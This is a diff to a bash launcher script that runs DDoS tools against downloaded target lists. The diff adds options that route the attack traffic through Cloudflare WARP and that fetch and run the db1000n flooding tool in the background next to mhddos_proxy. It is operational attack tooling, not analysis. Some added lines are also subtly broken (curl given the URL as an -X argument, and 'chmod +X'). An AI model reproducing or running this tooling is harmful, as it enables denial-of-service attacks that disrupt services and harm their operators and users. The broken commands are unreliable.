@@ -14,6 +14,8 @@ declare -a itarmy_paths=(
 packets="tmux jq git python3 python3-pip python3-venv iproute2"
 IFACE=$(ip -o -4 route show to default | awk '{print $5}')
 export IFACE
+export cloudflare="off";
+export db1000n="off";
 
 ##########################################
 ##### FUNCTIONS ##########################
@@ -118,6 +120,8 @@ while [ "$1" != "" ]; do
         --XXL  | --2XL) export ddos_size="XXL"; shift ;;
         --XXXL | --3XL) export ddos_size="XXXL"; shift ;;
         -s | --shape ) export shape="on"; export shape_limit="$(($2*1024))"; shift 2 ;;
+        -c | --cloudflare ) export cloudflare="on"; shift;;
+        -d | --db1000n ) export db1000n="on"; shift;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
 done
@@ -128,6 +132,34 @@ if [[ $shape == "on" ]]; then
     WS=$HOME'/multidd/wondershaper/wondershaper'
     export WS
     sudo "$WS" -a "$IFACE" -u "$shape_limit" -d "$shape_limit"
+fi
+if [[ $cloudflare == "on" ]]
+then
+    printf "Підготовка cloudflare..."
+    curl https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+    printf "\t [OK]\n"
+    printf "Підготовка пакетів..."
+    sudo apt update > /dev/null 2>&1
+    printf "\t [OK]\n"
+    printf "Завантаження cloudflare..."
+    sudo apt install cloudflare-warp > /dev/null 2>&1
+    printf "\t [OK]\n"
+    printf "Реєстрація у cloudflare..."
+    yes | warp-cli register > /dev/null 2>&1
+    printf "\t [OK]\n"
+
+fi
+if [[ $db1000n == "on" ]]
+then
+    printf "Завантаження db1000n..."
+    curl -s -X "https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64.tar.gz" -o ~/multidd/db1000n.tar.gz  > /dev/null 2>&1
+    printf "\t [OK]\n"
+    printf "Розпаковка db1000n..."
+    mkdir ~/multidd/db1000n > /dev/null 2>&1
+    tar -xf ~/multidd/db1000n.tar.gz -C ~/multidd/db1000n > /dev/null 2>&1
+    chmod +X ~/multidd/db1000n/db1000n
+    printf "\t [OK]\n"
 fi
 # create small separate script to re-launch only this small part of code
 cd ~/multidd || return
@@ -143,7 +175,14 @@ while true; do
     git clone https://github.com/LordWarWar/mhddos_proxy.git
     cd ~/multidd/mhddos_proxy || return
     python3 -m pip install -r requirements.txt
-
+    if [[ $cloudflare == "on" ]]
+    then
+        warp-cli connect
+    fi
+    if [[ $db1000n == "on" ]]
+    then
+        ~/multidd/db1000n/db1000n &
+    fi
     if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         python3 "$runner" -c ~/multidd/targets/lite_targets.txt "$methods" -t 1000 $args_to_pass &
@@ -196,6 +235,14 @@ while true; do
     pkill -f start.py; pkill -f runner.py;
     get_targets
     rm -rf ~/multidd/mhddos_proxy/
+    if [[ $db1000n == "on" ]]
+    then
+        pkill -f db1000n
+    fi
+    if [[ $cloudflare == "on" ]]
+    then
+        warp-cli disconnect
+    fi
 done
 EOF
 trap cleanup INT
